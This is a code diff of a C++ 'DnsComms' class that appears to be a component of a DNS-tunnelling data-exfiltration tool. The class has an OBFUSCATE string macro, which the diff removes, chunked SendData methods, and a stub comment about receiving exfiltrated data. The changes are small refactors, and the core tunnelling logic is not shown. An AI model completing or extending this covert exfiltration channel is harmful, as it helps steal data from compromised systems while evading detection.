@@ -9,14 +9,11 @@
 #include <cstdint>
 #include <string>
 
-// Obfuscated strings
-static const auto OBF_DNS_COMMS = OBFUSCATE("DnsComms");
-
 DnsComms::DnsComms(Configuration* config)
     : m_config(config), m_dnsServer("8.8.8.8") {}
 
 DnsComms::~DnsComms() {
-    Cleanup();
+    DnsComms::Cleanup();
 }
 
 bool DnsComms::Initialize() {
@@ -45,7 +42,7 @@ bool DnsComms::SendData(const std::vector<uint8_t>& data) {
 #endif
 }
 
-bool DnsComms::SendDataWindows(const std::vector<std::string>& chunks) const {
+bool DnsComms::SendDataWindows(const std::vector<std::string>& chunks) {
 #if PLATFORM_WINDOWS
     bool overallSuccess = true;
     
@@ -110,7 +107,7 @@ bool DnsComms::TestConnection() const {
 #endif
 }
 
-bool DnsComms::TestConnectionWindows() const {
+bool DnsComms::TestConnectionWindows() {
 #if PLATFORM_WINDOWS
     PDNS_RECORD dnsRecord;
     DNS_STATUS status = DnsQuery_A(
@@ -133,7 +130,7 @@ bool DnsComms::TestConnectionWindows() const {
 #endif
 }
 
-bool DnsComms::TestConnectionLinux() const {
+bool DnsComms::TestConnectionLinux() {
 #if PLATFORM_LINUX
     struct hostent* host = gethostbyname("google.com");
     return host != nullptr;
@@ -145,5 +142,5 @@ bool DnsComms::TestConnectionLinux() const {
 std::vector<uint8_t> DnsComms::ReceiveData() {
     // Implement DNS data exfiltration reception
     // This would typically involve running a DNS server
-    return std::vector<uint8_t>();
+    return {};
 }
